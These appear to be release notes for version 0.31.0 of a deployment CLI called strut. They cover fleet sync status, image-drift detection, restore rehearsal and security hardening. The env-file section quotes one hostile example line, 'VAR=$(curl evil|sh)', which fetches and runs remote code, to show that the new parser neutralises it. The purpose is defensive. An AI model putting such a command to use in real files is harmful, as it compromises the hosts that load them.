# What's New in v0.31.0

Released: July 7, 2026 — [View on GitHub](https://github.com/gfargo/strut/releases/tag/v0.31.0)

This release introduces fleet-wide visibility, image-drift detection, safe restore rehearsal, and foundational security hardening. It also completes milestones M2 (shipped features) and M3 (foundational refactors).

---

## New Features

### `strut fleet status` — Fleet-Wide Sync Visibility

See the git sync state of every host in your topology at a glance:

```
$ strut fleet status

  HOST         BRANCH   BEHIND AHEAD  DIRTY HEAD
  ────         ──────   ────── ─────  ───── ────
  compass      main     0      0      0     a3f81c2
  harbor       main     3      0      1     e92d4f1
  watch        main     12     0      0     7c91ab8
```

JSON mode available for monitoring integrations: `strut fleet status --json`

See: [Fleet Status wiki page](https://github.com/gfargo/strut/wiki/Fleet-Status)

### `strut <stack> drift images` — Image-Digest Drift Detection

Detects when running containers use stale images whose tags have silently moved on the registry:

```bash
strut my-stack drift images          # local
strut my-stack drift images --remote # check VPS
strut my-stack drift images --json   # machine-readable
```

### `strut <stack> restore <file> --dry-run` — Restore Rehearsal

Non-destructive restore: restores a dump into a scratch database, compares row counts against live, then drops the scratch DB. Never touches production data.

```bash
strut my-stack restore backups/postgres-20260707.sql --dry-run
```

---

## Security Hardening (v0.30.4)

### Safe Environment File Parser

All `set -a; source "$env_file"; set +a` patterns replaced with `safe_load_env` — a line-by-line KEY=VALUE parser that **never executes shell commands**. A pulled env file containing `VAR=$(curl evil|sh)` is now treated as the literal string `$(curl evil|sh)`.

**⚠️ Breaking change:** env files that relied on shell expansion (`$HOME`, `$(cmd)`, backtick substitution) will now load these as literal values. Use explicit paths instead of shell variables in `.env` files.

### SSH Host-Key Checking

Default changed from `StrictHostKeyChecking=no` to `StrictHostKeyChecking=accept-new` (TOFU model — accept on first connect, reject if the key changes).

Override with `STRUT_SSH_HOST_KEY_CHECK=no` for legacy behavior.

### Fleet PAT Security

- `fleet_sync` now only applies the `insteadOf` URL rewrite when a PAT is actually provided (fixes SSH deploy-key hosts)
- `clone_with_pat` uses a one-shot credential helper (PAT never on argv or in `.git/config`)
- `~/.git-credentials` appended, not clobbered

---

## Foundational Refactors (M3)

### Unified Connection Resolver

New `lib/connection.sh` provides `parse_host_spec` and `resolve_connection` — a single source of truth for parsing `user@host:port key deploy_dir=/path` specs. Replaces 6 duplicated inline parsers.

Host specs now support `deploy_dir=` for per-host deploy directory overrides:

```ini
[hosts]
harbor = deploy@10.0.0.2:22 ~/.ssh/key deploy_dir=/opt/stacks
```

### Drift Hashing Fix

Fixed phantom false positives in `drift detect` — the previous implementation added a trailing newline when hashing git-committed content, causing files without a final newline to always report as drifted.

### Skills Fixes

- `strut skills install claude` (positional arg) now works
- Existing hand-written context files are backed up before overwriting
- `--format all` includes the `generic` format

---

## Upgrade Notes

```bash
strut upgrade    # or: cd ~/strut && git pull origin main
strut --version  # should show 0.31.0
```

### Env File Behavior Change

If your `.env` files use shell expansion (e.g., `DATA_DIR=$HOME/data`), you'll need to replace them with explicit values (`DATA_DIR=/home/ubuntu/data`). The new safe parser treats `$` and backticks as literal characters.

### SSH Host Key

On first connection after upgrading, `accept-new` will re-accept the host key. If you later get a "host key changed" error, it means the remote host's key actually changed (potential MITM) — investigate before overriding.

To restore old behavior: `export STRUT_SSH_HOST_KEY_CHECK=no`
